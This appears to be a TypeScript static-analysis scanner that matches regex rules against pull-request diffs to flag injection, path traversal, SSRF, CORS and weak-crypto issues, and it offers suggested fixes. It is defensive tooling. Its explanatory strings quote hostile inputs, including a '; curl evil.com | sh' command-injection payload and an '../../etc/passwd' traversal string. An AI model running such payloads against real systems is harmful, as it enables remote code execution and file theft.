/**
 * Static Application Security Testing (SAST) Scanner.
 * Detects common OWASP Top 10 vulnerabilities deterministically from diffs:
 * - SQL Injection
 * - Command Injection
 * - Path Traversal
 * - Server-Side Request Forgery (SSRF)
 * - Insecure CORS
 * - Weak Cryptography
 * - Insecure Randomness for Tokens
 */

export interface SastRule {
  id: string;
  name: string;
  severity: "critical" | "high" | "medium" | "low";
  category: "security";
  pattern: RegExp;
  description: string;
  whyItMatters: string;
  suggestedFixTemplate: (matchedText: string) => string;
}

export interface ScannedSastFinding {
  file: string;
  line: number;
  title: string;
  severity: "critical" | "high" | "medium" | "low";
  category: "security";
  confidence: number;
  problem: string;
  why_it_matters: string;
  evidence: string;
  suggested_fix: string;
}

export const SAST_RULES: SastRule[] = [
  {
    id: "command_injection",
    name: "Command Injection via Child Process",
    severity: "critical",
    category: "security",
    pattern: /\b(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{[^`]+\}[^`]*`|[a-zA-Z0-9_\.]+\s*\+\s*["'`a-zA-Z0-9_\.])/g,
    description: "User input or variable concatenation detected inside a shell execution command.",
    whyItMatters: "An attacker who controls this variable can append arbitrary shell commands (e.g. '; curl evil.com | sh') and achieve Remote Code Execution (RCE) on the host machine.",
    suggestedFixTemplate: (matched) =>
      `// Replace shell exec with execFile or spawn and pass arguments as an array\n// instead of string concatenation:\nconst { execFile } = require("child_process");\nexecFile("binaryName", [arg1, arg2], (err, stdout) => { ... });`,
  },
  {
    id: "sql_injection",
    name: "SQL Injection via String Concatenation",
    severity: "critical",
    category: "security",
    pattern: /(?:(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+[^\n]*\$\{|\b(?:query|\$queryRawUnsafe|literal)\s*\(\s*`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)[^`]*\$\{)/i,
    description: "Direct string interpolation detected in a SQL statement.",
    whyItMatters: "Allows attackers to alter SQL query structure, bypass authentication, exfiltrate sensitive database records, or corrupt tables via SQL injection.",
    suggestedFixTemplate: (matched) =>
      `// Use parameterized queries or ORM tagged templates instead of string interpolation:\n// Example (node-postgres / pg):\nawait client.query("SELECT * FROM users WHERE id = $1", [userId]);\n// Example (Prisma):\nawait prisma.$queryRaw\`SELECT * FROM users WHERE id = \${userId}\`;`,
  },
  {
    id: "path_traversal",
    name: "Potential Path Traversal in File System Access",
    severity: "high",
    category: "security",
    pattern: /\bfs\.(?:readFile|readFileSync|createReadStream|writeFile|writeFileSync)\s*\(\s*(?:path\.join\([^)]*req\.(?:params|query|body)|req\.(?:params|query|body))/g,
    description: "File system access constructed directly from HTTP request parameters without sanitization.",
    whyItMatters: "Attackers can pass dot-dot-slash sequence ('../../etc/passwd') to traverse directory boundaries and read sensitive system files.",
    suggestedFixTemplate: (matched) =>
      `// Sanitize path and verify it stays inside base directory:\nconst safePath = path.resolve(BASE_DIR, path.basename(req.params.file));\nif (!safePath.startsWith(BASE_DIR)) throw new Error("Path traversal detected");\nfs.readFile(safePath, ...);`,
  },
  {
    id: "ssrf",
    name: "Server-Side Request Forgery (SSRF)",
    severity: "high",
    category: "security",
    pattern: /\b(?:fetch|axios\.get|axios\.post|http\.get|https\.get)\s*\(\s*req\.(?:params|query|body)\.[a-zA-Z0-9_]+/g,
    description: "HTTP client requests a URL supplied directly by user input without domain validation.",
    whyItMatters: "Enables attackers to force the server to send requests to internal network services, cloud metadata endpoints (169.254.169.254), or local loopback services (127.0.0.1).",
    suggestedFixTemplate: (matched) =>
      `// Validate URL protocol and allowlist target host:\nconst target = new URL(req.body.targetUrl);\nconst ALLOWED_HOSTS = ["api.example.com", "service.internal"];\nif (!ALLOWED_HOSTS.includes(target.hostname)) throw new Error("Untrusted destination");\nawait fetch(target.toString());`,
  },
  {
    id: "insecure_cors",
    name: "Overly Permissive Insecure CORS Configuration",
    severity: "medium",
    category: "security",
    pattern: /cors\(\s*\{[^\}]*origin\s*:\s*["'`]\*["'`][^\}]*credentials\s*:\s*true/g,
    description: "CORS configuration pairs wildcard origin ('*') with credentials: true.",
    whyItMatters: "Permits malicious third-party websites to make authenticated cross-origin requests and read private user session data.",
    suggestedFixTemplate: (matched) =>
      `// Explicitly allow specific trusted domains when credentials are enabled:\ncors({\n  origin: ["https://app.yourdomain.com"],\n  credentials: true\n})`,
  },
  {
    id: "weak_crypto_hash",
    name: "Weak Hash Algorithm (MD5 / SHA-1)",
    severity: "medium",
    category: "security",
    pattern: /crypto\.createHash\(\s*["'](?:md5|sha1)["']\s*\)/gi,
    description: "Legacy hash algorithm (MD5 or SHA-1) used for cryptographic operations.",
    whyItMatters: "MD5 and SHA-1 suffer from well-known collision attacks and do not meet modern security standards.",
    suggestedFixTemplate: (matched) =>
      `// Upgrade to modern SHA-256:\ncrypto.createHash("sha256")`,
  },
  {
    id: "insecure_token_randomness",
    name: "Insecure Randomness for Security Tokens",
    severity: "medium",
    category: "security",
    pattern: /(?:token|session|csrf|secret|apiKey)\s*=\s*[^;\n]*Math\.random\(\)/gi,
    description: "Math.random() used to generate security-sensitive tokens.",
    whyItMatters: "Math.random() is pseudorandom and predictable. Attackers can forecast future values to hijack sessions or forge tokens.",
    suggestedFixTemplate: (matched) =>
      `// Use cryptographically secure randomness:\nconst token = crypto.randomBytes(32).toString("hex");`,
  },
];

/**
 * Scans PR changed files/diffs for OWASP Top 10 SAST vulnerabilities.
 */
export function scanFilesForSast(
  files: Array<{ filename: string; patch?: string | undefined }>,
): ScannedSastFinding[] {
  const findings: ScannedSastFinding[] = [];

  for (const file of files) {
    if (!file.patch) continue;
    // Skip test fixtures or test directories for certain medium alerts
    const isTestFile = /\.(test|spec)\.[a-z]+$|__tests__|fixtures|mocks/i.test(file.filename);

    const lines = file.patch.split("\n");
    let currentLine = 1;

    for (const rawLine of lines) {
      const hunkMatch = rawLine.match(/^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/);
      if (hunkMatch) {
        currentLine = parseInt(hunkMatch[1]!, 10);
        continue;
      }

      if (rawLine.startsWith("+") && !rawLine.startsWith("+++")) {
        const lineContent = rawLine.slice(1);

        for (const rule of SAST_RULES) {
          if (isTestFile && rule.severity === "medium") continue;

          rule.pattern.lastIndex = 0;
          const match = rule.pattern.exec(lineContent);

          if (match && match[0]) {
            findings.push({
              file: file.filename,
              line: currentLine,
              title: `SAST: ${rule.name}`,
              severity: rule.severity,
              category: "security",
              confidence: isTestFile ? 0.75 : 0.95,
              problem: rule.description,
              why_it_matters: rule.whyItMatters,
              evidence: lineContent.trim(),
              suggested_fix: rule.suggestedFixTemplate(match[0]),
            });
            break; // One finding per line
          }
        }
        currentLine++;
      } else if (!rawLine.startsWith("-")) {
        currentLine++;
      }
    }
  }

  return findings;
}
